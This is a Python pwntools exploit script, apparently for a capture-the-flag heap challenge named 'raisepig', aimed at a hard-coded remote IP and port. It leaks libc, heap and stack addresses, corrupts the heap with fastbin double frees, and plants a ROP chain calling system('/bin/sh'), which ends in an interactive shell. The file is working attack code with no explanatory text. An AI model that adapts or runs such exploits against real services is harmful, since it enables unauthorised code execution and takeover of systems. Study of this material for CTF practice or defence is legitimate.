from pwn import *
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'

def Raise(p, length, name, tp):
	p.recvuntil('Your choice : ')
	p.sendline('1')
	p.recvuntil('name :')
	p.sendline(str(length))
	p.recvuntil(' pig :')
	p.send(name)
	p.recvuntil(' pig :')
	p.sendline(tp)

def Visit(p):
	p.recvuntil('Your choice : ')
	p.sendline('2')

def Eat(p, num):
	p.recvuntil('Your choice : ')
	p.sendline('3')
	p.recvuntil(' eat:')
	p.sendline(str(num))

def EatAll(p):
	p.recvuntil('Your choice : ')
	p.sendline('4')

def GameStart(ip, port, debug):
	if debug == 1:
		p = process('./raisepig')
		gdb.attach(p)
	else:
		p = remote(ip, port)
	libc = ELF('./libc-64')
	Raise(p, 0x100, 'hack by w1thcer', 'pig')
	Raise(p, 0x100, 'hack by w1tcher', 'pig')
	Raise(p, 0x100, 'hack by w1tcher', 'pig')
	Eat(p, 0)
	# Eat(p, 1)
	EatAll(p)
	Raise(p, 0x100, 'a' * 8, 'pig')
	Visit(p)
	p.recvuntil('a' * 8)
	libc.address = u64(p.recvuntil('\n')[ : -1].ljust(8, '\x00')) -0x3c4b78
	log.info('libc address ' + hex(libc.address))

	Eat(p, 0)
	Eat(p, 1)
	EatAll(p)
	Raise(p, 0x100, 'a' * 8, 'pig')
	Visit(p)

	p.recvuntil('a' * 8)
	heap_addr = u64(p.recvuntil('\n')[0 : -1].ljust(8, '\x00'))
	log.info('heap address ' + hex(heap_addr))

	Eat(p, 0)
	Eat(p, 2)
	EatAll(p)
	Raise(p, 0x100, '/bin/sh', 'pig')


	# Raise(p, 0x60, 'hack by w1tcher', 'pig')
	# Raise(p, 0x60, 'hack by w1tcher', 'pig')
	# Raise(p, 0x60, 'hack by w1tcher', 'pig')

	# Eat(p, 1)
	# Eat(p, 2)
	# Eat(p, 1)

	# Raise(p, 0x60, p64(libc.address + 0x3c4aed), 'pig')
	# Raise(p, 0x60, 'hack by w1tcher', 'pig')
	# Raise(p, 0x60, 'hack by w1tcher', 'pig')
	# Raise(p, 0x60, '\x00' * 0x3 + p64(libc.address + 0x85e20) + p64(libc.address + 0x85a00) + p64(libc.address + 0x4526a), 'pig')

	Raise(p, 0x28, 'hack by w1tcher', 'pig')
	Raise(p, 0x28, 'hack by w1tcher', 'pig')
	Raise(p, 0x28, 'hack by w1tcher', 'pig')
	# Raise(p, 0x28, 'hack by w1tcher', 'pig')

	Eat(p, 1)
	Eat(p, 2)
	# Eat(p, 3)
	Eat(p, 1)

	Raise(p, 0x28, 'hack by w1tcher', 'pig')
	Eat(p, 4)
	Raise(p, 0x28, p64(1) + p64(libc.symbols['environ']) + 'aaa', 'pig')
	Visit(p)
	p.recvuntil('Name[4] :')
	stack_addr = u64(p.recvuntil('\n')[ : -1].ljust(8, '\x00'))
	log.info('stack address' + hex(stack_addr))

	Raise(p, 0x60, 'hack by w1tcher', 'pig')
	Raise(p, 0x60, 'hack by w1tcher', 'pig')

	Raise(p, 0x50, 'hack by w1tcher', 'pig')
	Raise(p, 0x50, 'hack by w1tcher', 'pig')

	Raise(p, 0x60, 'hack by w1tcher', 'pig')

	Eat(p, 6)
	Eat(p, 7)
	Eat(p, 6)

	Eat(p, 8)
	Eat(p, 9)
	Eat(p, 8)

	Raise(p, 0x60, p64(0x60), 'pig')
	Raise(p, 0x60, 'hack by w1tcher', 'pig')
	Raise(p, 0x60, 'hack by w1tcher', 'pig')


	Raise(p, 0x50, p64(libc.address + 0x3c4b48), 'pig')
	Raise(p, 0x50, 'hack by w1tcher', 'pig')
	Raise(p, 0x50, 'hack by w1tcher', 'pig')
	Raise(p, 0x50, p64(0) * 4 + p64(stack_addr - 0x140), 'pig')
	Eat(p, 3)
	rop = ROP(libc)
	# rop.call(libc.symbols['read'], [0, stack_addr - 0x40, 0x100])
	rop.call(libc.symbols['system'], [heap_addr + 0x10])
	Raise(p, 0x100, str(rop), 'pig')

	# p.send('/bin/sh')

	# p.recvuntil('Your choice : ')
	# p.sendline('1')
	# p.recvuntil('name :')
	# p.sendline(str(1))

	p.interactive()

if __name__ == '__main__':
	GameStart("39.107.32.132", 9999, 1)